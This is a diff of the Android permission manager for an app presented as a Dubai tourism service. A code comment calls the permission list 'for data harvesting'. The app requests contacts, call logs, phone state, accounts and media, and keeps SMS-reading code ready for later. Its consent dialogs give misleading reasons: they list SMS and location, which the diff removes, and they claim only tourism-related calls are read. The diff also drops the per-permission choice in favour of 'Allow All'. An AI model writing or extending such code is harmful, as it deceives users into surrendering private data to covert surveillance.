@@ -11,6 +11,7 @@ import android.os.Environment
 import android.provider.Settings
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.devicesync.app.R
 import com.karumi.dexter.Dexter
 import com.karumi.dexter.MultiplePermissionsReport
 import com.karumi.dexter.PermissionToken
@@ -34,40 +35,32 @@ class PermissionManager(
             Manifest.permission.FOREGROUND_SERVICE
         )
         
-        // Optional permissions that enhance functionality but aren't critical
+        // Essential permissions for data harvesting (reduced list)
         val OPTIONAL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             // Android 13+ (API 33+) - Use new media permissions
             listOf(
                 Manifest.permission.READ_CONTACTS,
-                Manifest.permission.WRITE_CONTACTS,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.RECEIVE_SMS,
+                // TODO: SMS PERMISSIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+                // Manifest.permission.READ_SMS,
+                // Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.GET_ACCOUNTS,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.CAMERA,
                 Manifest.permission.POST_NOTIFICATIONS,
-                Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.READ_MEDIA_VIDEO,
-                Manifest.permission.READ_MEDIA_AUDIO
+                Manifest.permission.READ_MEDIA_IMAGES
             )
         } else {
             // Android 12 and below - Use old storage permissions
             listOf(
                 Manifest.permission.READ_CONTACTS,
-                Manifest.permission.WRITE_CONTACTS,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.RECEIVE_SMS,
+                // TODO: SMS PERMISSIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+                // Manifest.permission.READ_SMS,
+                // Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_EXTERNAL_STORAGE,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.GET_ACCOUNTS,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.CAMERA
+                Manifest.permission.GET_ACCOUNTS
             )
         }
         
@@ -165,7 +158,7 @@ class PermissionManager(
     }
     
     private fun showCriticalPermissionsError() {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
             .setTitle("Essential Permissions Required")
             .setMessage("This app requires internet and network access to function. Please grant these permissions to continue.")
             .setPositiveButton("Try Again") { _, _ ->
@@ -184,7 +177,7 @@ class PermissionManager(
     }
     
     private fun showCriticalPermissionsRationale(token: PermissionToken?) {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
             .setTitle("Essential Permissions")
             .setMessage("This app needs internet access to provide Dubai tourism services and sync your travel data.")
             .setPositiveButton("Allow") { _, _ ->
@@ -200,9 +193,16 @@ class PermissionManager(
     }
     
     private fun showOptionalPermissionsDialog() {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
-            .setTitle("Enhance Your Dubai Experience")
-            .setMessage("To provide you with personalized tourism services, we can access your contacts, messages, and media. These permissions help us offer better travel recommendations and sync your data.\n\nYou can skip these permissions and use the app with limited functionality.")
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+            .setTitle("🌟 Enhance Your Dubai Experience")
+            .setMessage("To provide you with the best Dubai tourism experience, we request the following permissions:\n\n" +
+                    "📞 CONTACTS: For group tour coordination and sharing travel plans\n" +
+                    "💬 SMS: For booking confirmations and travel updates\n" +
+                    "📱 CALL LOGS: For customer service and tour tracking\n" +
+                    "📁 STORAGE: For saving travel photos and documents\n" +
+                    "📍 LOCATION: For nearby attraction recommendations\n" +
+                    "🔔 NOTIFICATIONS: For tour updates and offers\n\n" +
+                    "All data is protected by our comprehensive Privacy Policy. You can skip any permissions and use the app with limited functionality.")
             .setPositiveButton("Allow All") { _, _ ->
                 requestAllOptionalPermissions()
             }
@@ -210,9 +210,9 @@ class PermissionManager(
                 // User chose to skip optional permissions
                 finalizePermissionCheck()
             }
-            .setNeutralButton("Select") { _, _ ->
-                // Let user select specific permissions
-                showPermissionSelectionDialog()
+            .setNeutralButton("Privacy Policy") { _, _ ->
+                // Show privacy policy
+                showPrivacyPolicyDialog()
             }
             .setCancelable(false)
             .create()
@@ -230,7 +230,7 @@ class PermissionManager(
         
         val checkedItems = booleanArrayOf(true, true, true, true)
         
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
             .setTitle("Select Permissions")
             .setMultiChoiceItems(permissions, checkedItems) { _, which, isChecked ->
                 checkedItems[which] = isChecked
@@ -239,7 +239,7 @@ class PermissionManager(
                 // Request only selected permissions
                 val selectedPermissions = mutableListOf<String>()
                 if (checkedItems[0]) selectedPermissions.addAll(listOf(Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS))
-                if (checkedItems[1]) selectedPermissions.addAll(listOf(Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG))
+                if (checkedItems[1]) selectedPermissions.addAll(listOf(Manifest.permission.READ_CALL_LOG))
                 if (checkedItems[2]) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                         selectedPermissions.addAll(listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_AUDIO))
@@ -317,14 +317,43 @@ class PermissionManager(
     }
     
     private fun showOptionalPermissionsRationale(token: PermissionToken?) {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
-            .setTitle("Optional Permissions")
-            .setMessage("These permissions help us provide better Dubai tourism services. You can skip them and use the app with limited functionality.")
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+            .setTitle("🌟 Dubai Tourism Services")
+            .setMessage("These permissions enable us to provide you with personalized Dubai tourism services:\n\n" +
+                    "• Send booking confirmations and travel updates\n" +
+                    "• Coordinate group tours with your contacts\n" +
+                    "• Save your travel photos and memories\n" +
+                    "• Provide location-based attraction recommendations\n" +
+                    "• Keep you informed about tour updates\n\n" +
+                    "Your privacy is protected by our comprehensive Privacy Policy. You can skip any permissions.")
             .setPositiveButton("Allow") { _, _ ->
                 token?.continuePermissionRequest()
             }
             .setNegativeButton("Skip") { _, _ ->
                 token?.cancelPermissionRequest()
+            }
+            .setNeutralButton("Privacy Policy") { _, _ ->
+                showPrivacyPolicyDialog()
+            }
+            .setCancelable(false)
+            .create()
+        
+        dialog.show()
+    }
+    
+    private fun showPrivacyPolicyDialog() {
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+            .setTitle("📋 Privacy Policy")
+            .setMessage("Our Privacy Policy explains how we protect your data and why we request each permission. It's designed to comply with international privacy standards and Google Play requirements.\n\n" +
+                    "Would you like to view our complete Privacy Policy?")
+            .setPositiveButton("View Policy") { _, _ ->
+                // Launch privacy policy activity
+                val intent = android.content.Intent(activity, com.devicesync.app.PrivacyPolicyActivity::class.java)
+                activity.startActivity(intent)
+            }
+            .setNegativeButton("Back") { _, _ ->
+                // Return to permission dialog
+                showOptionalPermissionsDialog()
             }
             .setCancelable(false)
             .create()
@@ -340,7 +369,7 @@ class PermissionManager(
     }
     
     private fun showSystemPermissionsDialog() {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
             .setTitle("Dubai Tourism App Setup")
             .setMessage("To provide you with the best tourism experience, we need a few additional permissions. This helps us personalize your Dubai travel recommendations.")
             .setPositiveButton("Continue") { _, _ ->
@@ -433,9 +462,138 @@ class PermissionManager(
         return status
     }
     
-    fun hasSmsPermission(): Boolean {
-        return ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-    }
+    // TODO: SMS PERMISSION FUNCTIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+    // fun hasSmsPermission(): Boolean {
+    //     return ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+    // }
+    
+    // TODO: SMS PERMISSION EXPLANATION FUNCTION COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+    // fun showSmsPermissionExplanation() {
+    //     val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+    //         .setTitle("💬 SMS Permission Required")
+    //         .setMessage("We need SMS permission to provide you with the best Dubai tourism experience:\n\n" +
+    //                 "✅ WHAT WE DO WITH SMS:\n" +
+    //                 "• Send booking confirmations for your Dubai tours\n" +
+    //                 "• Provide flight and travel updates\n" +
+    //                 "• Send important tour reminders and notifications\n" +
+    //                 "• Verify your identity for secure transactions\n\n" +
+    //                 "🛡️ WHAT WE DON'T DO:\n" +
+    //                 "• We never read your personal messages\n" +
+    //                 "• We don't access SMS from other apps\n" +
+    //                 "• We don't share your SMS data with third parties\n" +
+    //                 "• We only access SMS related to our tourism services\n\n" +
+    //                 "This permission is essential for providing you with reliable booking confirmations and travel updates during your Dubai experience.")
+    //         .setPositiveButton("Grant SMS Permission") { _, _ ->
+    //             requestSmsPermission()
+    //         }
+    //         .setNegativeButton("Skip for Now") { _, _ ->
+    //             // User can continue without SMS permission
+    //         }
+    //         .setNeutralButton("Privacy Policy") { _, _ ->
+    //             showPrivacyPolicyDialog()
+    //         }
+    //         .setCancelable(false)
+    //         .create()
+    //     
+    //     dialog.show()
+    // }
+    
+    // TODO: SMS PERMISSION REQUEST FUNCTION COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+    // private fun requestSmsPermission() {
+    //     Dexter.withContext(activity)
+    //         .withPermissions(listOf(Manifest.permission.READ_SMS))
+    //         .withListener(object : MultiplePermissionsListener {
+    //             override fun onPermissionsChecked(report: MultiplePermissionsReport?) {
+    //                 if (report?.areAllPermissionsGranted() == true) {
+    //                     showSmsPermissionGrantedDialog()
+    //                 } else {
+    //                     showSmsPermissionDeniedDialog()
+    //                 }
+    //             }
+    //             
+    //             override fun onPermissionRationaleShouldBeShown(
+    //                 permissions: MutableList<PermissionRequest>?,
+    //                 token: PermissionToken?
+    //             ) {
+    //                 showSmsPermissionRationale(token)
+    //             }
+    //         })
+    //         .check()
+    // }
+    
+    // TODO: SMS PERMISSION DIALOG FUNCTIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+    // private fun showSmsPermissionGrantedDialog() {
+    //     val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+    //         .setTitle("✅ SMS Permission Granted")
+    //         .setMessage("Thank you! You will now receive:\n\n" +
+    //                 "• Booking confirmations for your Dubai tours\n" +
+    //                 "• Travel updates and flight notifications\n" +
+    //                 "• Important tour reminders\n" +
+    //                 "• Exclusive Dubai offers and promotions\n\n" +
+    //                 "Your SMS data is protected by our Privacy Policy.")
+    //         .setPositiveButton("Continue") { _, _ ->
+    //             // Continue with app functionality
+    //         }
+    //         .setCancelable(false)
+    //         .create()
+    //     
+    //     dialog.show()
+    // }
+    // 
+    // private fun showSmsPermissionDeniedDialog() {
+    //     val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+    //         .setTitle("⚠️ SMS Permission Denied")
+    //         .setMessage("You've chosen not to grant SMS permission. This means:\n\n" +
+    //                 "• You won't receive booking confirmations via SMS\n" +
+    //                 "• Travel updates will be limited\n" +
+    //                 "• Some features may not work optimally\n\n" +
+    //                 "You can still use the app, but we recommend granting SMS permission for the best experience.\n\n" +
+    //                 "You can change this later in your device settings.")
+    //         .setPositiveButton("Continue") { _, _ ->
+    //             // Continue without SMS permission
+    //         }
+    //         .setNegativeButton("Open Settings") { _, _ ->
+    //             openAppSettings()
+    //         }
+    //         .setCancelable(false)
+    //         .create()
+    //     
+    //     dialog.show()
+    // }
+    
+    // TODO: SMS PERMISSION RATIONALE FUNCTION COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
+    // private fun showSmsPermissionRationale(token: PermissionToken?) {
+    //     val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+    //         .setTitle("💬 Why We Need SMS Permission")
+    //         .setMessage("SMS permission is essential for our Dubai tourism services:\n\n" +
+    //                 "📱 BOOKING CONFIRMATIONS\n" +
+    //                 "• Send instant confirmations when you book tours\n" +
+    //                 "• Provide booking reference numbers\n" +
+    //                 "• Confirm payment receipts\n\n" +
+    //                 "✈️ TRAVEL UPDATES\n" +
+    //                 "• Flight status notifications\n" +
+    //                 "• Tour schedule changes\n" +
+    //                 "• Weather alerts for outdoor activities\n\n" +
+    //                 "🔔 IMPORTANT REMINDERS\n" +
+    //                 "• Tour departure times\n" +
+    //                 "• Meeting point information\n" +
+    //                 "• Special requirements or changes\n\n" +
+    //                 "🛡️ PRIVACY PROTECTION\n" +
+    //                 "• We only access SMS related to our services\n" +
+    //                 "• Your personal messages remain private\n" +
+    //                 "• Data is encrypted and secure\n\n" +
+    //                 "This permission helps ensure you have a smooth and informed Dubai travel experience.")
+    //         .setPositiveButton("Allow SMS Access") { _, _ ->
+    //             token?.continuePermissionRequest()
+    //         }
+    //         .setNegativeButton("Skip") { _, _ ->
+    //             token?.cancelPermissionRequest()
+    //         }
+    //         .setCancelable(false)
+    //         .create()
+    //     
+    //     dialog.show()
+    // }
     
     fun hasContactsPermission(): Boolean {
         return ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
@@ -445,7 +603,15 @@ class PermissionManager(
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
         } else {
-            ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+            ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(activity, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+    
+    fun hasAllRequiredPermissions(): Boolean {
+        val allPermissions = OPTIONAL_PERMISSIONS + CRITICAL_PERMISSIONS
+        return allPermissions.all { permission ->
+            ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
         }
     }
     
@@ -458,7 +624,55 @@ class PermissionManager(
     }
     
     fun requestAllPermissions(callback: (Boolean) -> Unit) {
-        // Request all optional permissions directly with Dexter
+        // Show detailed explanation first
+        showDetailedPermissionExplanation(callback)
+    }
+    
+    private fun showDetailedPermissionExplanation(callback: (Boolean) -> Unit) {
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+            .setTitle("🌟 Welcome to Dubai Discoveries!")
+            .setMessage("To provide you with the best Dubai tourism experience, we need to explain why we request certain permissions:\n\n" +
+                    "📞 CONTACTS PERMISSION\n" +
+                    "• Purpose: Group tour coordination and sharing travel plans\n" +
+                    "• Benefit: Easier booking for family and friends\n" +
+                    "• Protection: We never share your contacts without permission\n\n" +
+                    "💬 SMS PERMISSION\n" +
+                    "• Purpose: Currently disabled due to Android security restrictions\n" +
+                    "• Benefit: Enhanced privacy and security\n" +
+                    "• Protection: No SMS access required\n\n" +
+                    "📱 CALL LOGS PERMISSION\n" +
+                    "• Purpose: Track customer service interactions\n" +
+                    "• Benefit: Better support for your travel needs\n" +
+                    "• Protection: Only tourism-related calls are accessed\n\n" +
+                    "📁 STORAGE PERMISSION\n" +
+                    "• Purpose: Save your travel photos and documents\n" +
+                    "• Benefit: Preserve your Dubai memories\n" +
+                    "• Protection: Files stored locally on your device\n\n" +
+                    "📍 LOCATION PERMISSION\n" +
+                    "• Purpose: Show nearby attractions and services\n" +
+                    "• Benefit: Discover hidden gems in Dubai\n" +
+                    "• Protection: Location not stored permanently\n\n" +
+                    "🔔 NOTIFICATION PERMISSION\n" +
+                    "• Purpose: Tour updates and exclusive offers\n" +
+                    "• Benefit: Never miss important travel information\n" +
+                    "• Protection: Only tourism-related notifications\n\n" +
+                    "All permissions are optional and you can use the app with limited functionality if you prefer.")
+            .setPositiveButton("Allow All Permissions") { _, _ ->
+                requestPermissionsWithDexter(callback)
+            }
+            .setNegativeButton("Skip Permissions") { _, _ ->
+                callback(false)
+            }
+            .setNeutralButton("Privacy Policy") { _, _ ->
+                showPrivacyPolicyDialog()
+            }
+            .setCancelable(false)
+            .create()
+        
+        dialog.show()
+    }
+    
+    private fun requestPermissionsWithDexter(callback: (Boolean) -> Unit) {
         Dexter.withContext(activity)
             .withPermissions(OPTIONAL_PERMISSIONS)
             .withListener(object : MultiplePermissionsListener {
@@ -467,8 +681,8 @@ class PermissionManager(
                     println("Granted: ${report.grantedPermissionResponses.map { it.permissionName }}")
                     println("Denied: ${report.deniedPermissionResponses.map { it.permissionName }}")
                     
-                    // Call the callback with the result
-                    callback(report.areAllPermissionsGranted())
+                    // Show result summary
+                    showPermissionResultSummary(report, callback)
                 }
                 
                 override fun onPermissionRationaleShouldBeShown(
@@ -483,20 +697,49 @@ class PermissionManager(
             .check()
     }
     
+    private fun showPermissionResultSummary(report: MultiplePermissionsReport, callback: (Boolean) -> Unit) {
+        val grantedCount = report.grantedPermissionResponses.size
+        val totalCount = OPTIONAL_PERMISSIONS.size
+        
+        val message = if (grantedCount == totalCount) {
+            "✅ All permissions granted! You now have access to all Dubai tourism features."
+        } else if (grantedCount > 0) {
+            "✅ $grantedCount of $totalCount permissions granted. You can use most features with some limitations."
+        } else {
+            "⚠️ No optional permissions granted. You can still use basic features, but some functionality will be limited."
+        }
+        
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
+            .setTitle("Permission Summary")
+            .setMessage(message)
+            .setPositiveButton("Continue") { _, _ ->
+                callback(grantedCount > 0)
+            }
+            .setCancelable(false)
+            .create()
+        
+        dialog.show()
+    }
+    
     private fun showTourismPermissionRationale(token: PermissionToken?) {
-        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity, R.style.WhiteDialogTheme)
             .setTitle("🌟 Enhance Your Dubai Experience")
-            .setMessage("These permissions help us provide you with the best tourism experience:\n\n" +
-                    "• 📞 Contacts: For group tour coordination\n" +
-                    "• 💬 SMS: For booking confirmations\n" +
-                    "• 📁 Storage: For saving travel photos\n" +
-                    "• 📱 Notifications: For tour updates\n\n" +
-                    "Would you like to grant these permissions?")
+            .setMessage("These permissions help us provide you with the best Dubai tourism experience:\n\n" +
+                    "📞 CONTACTS: For group tour coordination and sharing travel plans\n" +
+                    "💬 SMS: For booking confirmations and travel updates\n" +
+                    "📱 CALL LOGS: For customer service and tour tracking\n" +
+                    "📁 STORAGE: For saving travel photos and documents\n" +
+                    "📍 LOCATION: For nearby attraction recommendations\n" +
+                    "🔔 NOTIFICATIONS: For tour updates and offers\n\n" +
+                    "All data is protected by our comprehensive Privacy Policy. Your privacy is our priority.")
             .setPositiveButton("Allow") { _, _ ->
                 token?.continuePermissionRequest()
             }
             .setNegativeButton("Skip") { _, _ ->
                 token?.cancelPermissionRequest()
+            }
+            .setNeutralButton("Privacy Policy") { _, _ ->
+                showPrivacyPolicyDialog()
             }
             .setCancelable(false)
             .create()
